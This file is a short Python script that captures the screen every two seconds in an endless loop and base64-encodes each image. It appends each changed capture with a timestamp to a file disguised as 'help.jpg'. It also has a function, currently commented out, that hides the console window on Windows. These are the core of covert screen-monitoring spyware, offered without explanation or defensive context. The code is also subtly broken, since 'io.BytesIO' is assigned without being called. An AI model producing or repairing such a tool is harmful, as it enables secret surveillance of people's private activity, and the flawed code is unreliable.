import sys,time,base64,io
from datetime import datetime

platform = sys.platform
if platform == 'win32':
    import win32gui , win32console
    from desktopmagic.screengrab_win32 import getScreenAsImage
else:
    import pyscreenshot as ImageGrab

lstImg = ''
flePath = 'help.jpg'
dur = 2
imgQly =10

def hideWindow():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)

def writeData(data):
    with open(flePath ,'a') as fle:
        fle.write(data)
    fle.close()

if __name__ == "__main__":
    # if platform == "win32":
    #     hideWindow()
    while True:
        if platform == "win32":
            img = getScreenAsImage()
        else:
            img = ImageGrab.grab()

        buf =io.BytesIO
        img.save(buf,format='JPEG')
        img64=str(base64.b64encode(buf.getvalue()).decode())
        if lstImg != img64:
            lstImg = img64
            writeData('::s::' + str(datetime.now())+'\n'+str(img64)+'\n')
        time.sleep(dur)